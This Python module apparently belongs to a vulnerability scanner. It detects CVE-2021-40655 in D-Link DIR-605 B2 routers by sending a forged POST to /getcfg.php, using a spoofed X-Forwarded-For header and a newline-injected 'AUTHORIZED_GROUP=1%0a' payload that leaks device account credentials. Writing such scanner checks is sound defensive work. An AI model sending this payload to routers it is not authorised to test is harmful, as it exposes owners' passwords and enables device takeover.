"""Agent Asteroid implementation for CVE-2021-40655"""

import re

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "Information disclosure issue exists in D-LINK-DIR-605 B2"
VULNERABILITY_REFERENCE = "CVE-2021-40655"
VULNERABILITY_DESCRIPTION = (
    "An information disclosure issue exists in D-LINK-DIR-605 B2 Firmware Version : 2.01MT."
    " An attacker can obtain a user name and password by forging a post request to the / getcfg.php page"
)
RISK_RATING = "CRITICAL"

HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Forwarded-For": "127.0.0.1",
}


@exploits_registry.register
class CVE202140655Exploit(webexploit.WebExploit):
    accept_request = definitions.Request(method="GET", path="/")
    check_request = definitions.Request(
        method="POST",
        path="/getcfg.php",
        headers=HEADERS,
        data=b"SERVICES=DEVICE.ACCOUNT&AUTHORIZED_GROUP=1%0a",
    )
    accept_pattern = [re.compile("D-Link")]
    match_pattern = [re.compile(r"DEVICE\.ACCOUNT")]
    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )
